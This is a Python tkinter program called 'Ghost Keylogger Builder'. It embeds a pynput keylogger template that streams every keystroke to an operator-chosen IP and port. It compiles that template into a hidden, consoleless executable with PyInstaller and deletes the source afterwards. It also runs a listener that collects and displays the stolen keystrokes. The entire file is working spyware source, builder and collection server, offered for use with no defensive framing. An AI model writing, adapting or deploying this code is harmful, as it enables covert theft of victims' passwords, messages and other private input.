import tkinter as tk
import subprocess
import os
import socket
import threading
from tkinter import scrolledtext

KEYLOGGER_TEMPLATE = '''import socket
import sys
from pynput.keyboard import Listener, Key

def connect_to_server(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        return s
    except Exception as e:
        sys.stderr.write("Connection failed: " + str(e) + "\\n")
        return None

def send_key(key, socket):
    try:
        if socket:
            socket.send(("[" + str(key) + "]").encode('utf-8'))
    except Exception as e:
        sys.stderr.write("Send error: " + str(e) + "\\n")

def on_press(key, socket):
    try:
        send_key(key.char, socket)
    except AttributeError:
        send_key(str(key), socket)

def on_release(key, socket):
    if key == Key.esc:
        return False
    return True

def run_keylogger():
    ip = "{ip}"
    port = {port}
    sock = connect_to_server(ip, port)
    if sock:
        with Listener(
            on_press=lambda k: on_press(k, sock),
            on_release=lambda k: on_release(k, sock)
        ) as listener:
            listener.join()
        sock.close()

if __name__ == "__main__":
    run_keylogger()
'''

class KeyloggerBuilder:
    def __init__(self, root):
        self.root = root
        self.listener_window = None
        self.server_socket = None
        self.listening = False
        self.setup_ui()
        
    def setup_ui(self):
        self.root.title("Ghost Keylogger Builder")
        self.root.geometry("500x500")
        
        # Builder Frame
        builder_frame = tk.LabelFrame(self.root, text="Keylogger Builder", padx=10, pady=10)
        builder_frame.pack(pady=10, padx=10, fill=tk.X)
        
        tk.Label(builder_frame, text="Target IP:").pack(pady=(5,5))
        self.ip_entry = tk.Entry(builder_frame, width=25)
        self.ip_entry.pack()
        
        tk.Label(builder_frame, text="Target Port:").pack(pady=(5,5))
        self.port_entry = tk.Entry(builder_frame, width=10)
        self.port_entry.pack()
        
        self.build_btn = tk.Button(
            builder_frame, 
            text="Build Executable", 
            command=self.build,
            bg="#FF5555",
            fg="white",
            padx=20,
            pady=5
        )
        self.build_btn.pack(pady=10)
        
        self.status = tk.Label(builder_frame, text="", fg="black")
        self.status.pack()
        
        self.console = tk.Text(builder_frame, height=8, state='disabled')
        self.console.pack(fill=tk.X, padx=5, pady=5)
        
        # Listener Frame
        listener_frame = tk.LabelFrame(self.root, text="Keylogger Listener", padx=10, pady=10)
        listener_frame.pack(pady=10, padx=10, fill=tk.BOTH, expand=True)
        
        self.start_listener_btn = tk.Button(
            listener_frame,
            text="Start Listener",
            command=self.toggle_listener,
            bg="#5555FF",
            fg="white",
            padx=20,
            pady=5
        )
        self.start_listener_btn.pack(pady=5)
        
        self.keystroke_display = scrolledtext.ScrolledText(listener_frame, height=10, state='disabled')
        self.keystroke_display.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
    
    def log(self, message):
        self.console.config(state='normal')
        self.console.insert(tk.END, message + "\n")
        self.console.config(state='disabled')
        self.console.see(tk.END)
        self.root.update()
    
    def log_keystroke(self, message):
        self.keystroke_display.config(state='normal')
        self.keystroke_display.insert(tk.END, message)
        self.keystroke_display.config(state='disabled')
        self.keystroke_display.see(tk.END)
        self.root.update()
    
    def validate(self, ip, port):
        if not ip or not port:
            raise ValueError("Both IP and Port are required")
        
        parts = ip.split('.')
        if len(parts) != 4:
            raise ValueError("Invalid IP format (should be X.X.X.X)")
        
        for p in parts:
            if not p.isdigit() or not 0 <= int(p) <= 255:
                raise ValueError("IP segments must be 0-255")
            
        if not port.isdigit():
            raise ValueError("Port must be a number")
        
        port_num = int(port)
        if not 1 <= port_num <= 65535:
            raise ValueError("Port must be 1-65535")
        
        return True
    
    def generate_script(self, ip, port):
        try:
            self.validate(ip, port)
            script = KEYLOGGER_TEMPLATE.format(ip=ip, port=port)
            with open('keylogger.py', 'w') as f:
                f.write(script)
            self.log("[+] Keylogger script generated successfully")
            return True
        except Exception as e:
            self.log("[!] Error: " + str(e))
            return False
    
    def build_executable(self):
        try:
            self.log("[+] Building executable...")
            subprocess.run([
                'pyinstaller',
                '--onefile',
                '--windowed',
                '--noconsole',
                '--name=GhostKeylogger',
                'keylogger.py'
            ], check=True)
            self.log("[+] Executable built successfully in 'dist' folder")
            if os.path.exists('keylogger.py'):
                os.remove('keylogger.py')
            return True
        except subprocess.CalledProcessError as e:
            self.log("[!] Build failed: " + str(e))
            return False
        except Exception as e:
            self.log("[!] Error: " + str(e))
            return False
    
    def build(self):
        ip = self.ip_entry.get().strip()
        port = self.port_entry.get().strip()
        
        self.console.config(state='normal')
        self.console.delete(1.0, tk.END)
        self.console.config(state='disabled')
        
        if self.generate_script(ip, port):
            if self.build_executable():
                self.status.config(text="Build successful!", fg="green")
            else:
                self.status.config(text="Build failed", fg="red")
        else:
            self.status.config(text="Invalid parameters", fg="red")
    
    def start_listener(self, port):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.bind(('0.0.0.0', port))
            self.server_socket.listen(1)
            self.log(f"[+] Listening for keylogger connections on port {port}")
            
            while self.listening:
                conn, addr = self.server_socket.accept()
                self.log(f"[+] Connection established from {addr[0]}:{addr[1]}")
                
                while self.listening:
                    try:
                        data = conn.recv(1024).decode('utf-8')
                        if not data:
                            break
                        self.log_keystroke(data)
                    except:
                        break
                
                conn.close()
                self.log("[+] Connection closed")
            
            self.server_socket.close()
        except Exception as e:
            self.log(f"[!] Listener error: {str(e)}")
    
    def toggle_listener(self):
        if not self.listening:
            try:
                port = int(self.port_entry.get().strip())
                self.listening = True
                self.start_listener_btn.config(text="Stop Listener", bg="#FF5555")
                threading.Thread(target=self.start_listener, args=(port,), daemon=True).start()
            except ValueError:
                self.log("[!] Please enter a valid port number first")
        else:
            self.listening = False
            self.start_listener_btn.config(text="Start Listener", bg="#5555FF")
            if self.server_socket:
                try:
                    self.server_socket.close()
                except:
                    pass
            self.log("[+] Listener stopped")

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerBuilder(root)
    root.mainloop()